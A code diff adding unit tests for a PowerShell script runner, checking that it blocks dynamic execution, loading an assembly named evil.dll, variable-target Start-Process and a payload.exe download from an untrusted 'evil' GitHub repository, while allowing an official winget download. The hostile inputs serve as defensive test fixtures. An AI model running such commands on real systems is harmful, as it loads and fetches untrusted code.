@@ -269,4 +269,130 @@ public sealed class PowerShellRunnerTests
         Assert.Equal(124, result.ExitCode);
         Assert.Contains("timed out", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
     }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksScriptBlockCreateDynamicExecution()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.scriptblock-create",
+            StepName = "apply",
+            Script = "[scriptblock]::Create('Write-Output \"x\"').Invoke()",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("scriptblock", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksInvokeScriptDynamicExecution()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.invokescript",
+            StepName = "apply",
+            Script = "$ExecutionContext.InvokeCommand.InvokeScript('Write-Output \"x\"')",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("InvokeScript", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksUsingAssemblyDirective()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.using-assembly",
+            StepName = "apply",
+            Script = "using assembly 'C:\\\\Temp\\\\evil.dll'; Write-Output 'x'",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("using", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksVariableBasedStartProcessTarget()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.start-process-variable",
+            StepName = "apply",
+            Script = "$exePath='notepad.exe'; Start-Process -FilePath $exePath",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("Start-Process", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_AllowsScopedGithubRepositoryDownload_WhenDryRun()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.github-allowed",
+            StepName = "download",
+            Script = "Invoke-WebRequest -Uri 'https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle' -OutFile \"$env:TEMP\\winget.msixbundle\"",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.True(result.Success);
+        Assert.Equal(0, result.ExitCode);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksUntrustedGithubRepositoryDownload_WhenDryRun()
+    {
+        var settings = new AppSettings();
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "updates.test.github-blocked",
+            StepName = "download",
+            Script = "Invoke-WebRequest -Uri 'https://github.com/evil/repo/releases/download/payload.exe' -OutFile \"$env:TEMP\\payload.exe\"",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("Blocked download host", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
+    }
 }
